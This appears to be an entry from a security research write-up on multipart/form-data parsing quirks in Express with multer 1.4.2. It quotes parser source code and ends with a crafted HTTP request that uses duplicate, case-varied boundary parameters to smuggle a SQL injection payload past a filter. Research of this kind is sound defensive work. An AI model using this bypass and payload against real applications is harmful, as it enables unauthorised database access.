### Express multer 1.4.2

**Endpoint**
```js
var express = require('express')
var app = express()
var multer  = require('multer')
var upload = multer()

app.post('/', upload.none(), function (req, res, next) {
  data = req.body
```

**Source code**  

[/expressjs/multer/lib/make-middleware.js](https://github.com/expressjs/multer/blob/d4e7cd822099ce0fea22b5a5070b848f38a35b2d/lib/make-middleware.js#L17-L18)
```js
return function multerMiddleware (req, res, next) {
  if (!is(req, ['multipart'])) return next()
```

[/jshttp/type-is/index.js](https://github.com/jshttp/type-is/blob/c1f4388c71c8a01f79934e68f630ca4a15fffcd6/index.js#L161-L171)
```js
function normalize (type) {
  ...
  switch (type) {
  ...
    case 'multipart':
      return 'multipart/*'
```

[/mscdex/busboy/lib/types/multipart.js](https://github.com/mscdex/busboy/blob/db9b25f2b88fd4689d78d74b1fdc9de7f10d5f3d/lib/types/multipart.js#L23)
```js
Multipart.detect = /^multipart\/form-data/i;
```

**Content-Type**  
```
multipart/form-dataXXX
```

**Multipart Content-Type**
| Check             | Value            |
|-------------------|------------------|
| Mime-Type         | case-insensitive |
| Multiple boundary | first position   |
| Boundary key      | case-insensitive |

**HTTP Request**
```http
POST / HTTP/1.1
Host: localhost
Content-Type: MULTIPART/FORM-DATAXXX; BOUNDARY=xxx; boundary=yyy
Content-Length: 187

--yyy
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

--xxx
Content-Disposition: form-data; name="q"

' union select '1
--xxx--
--yyy--
```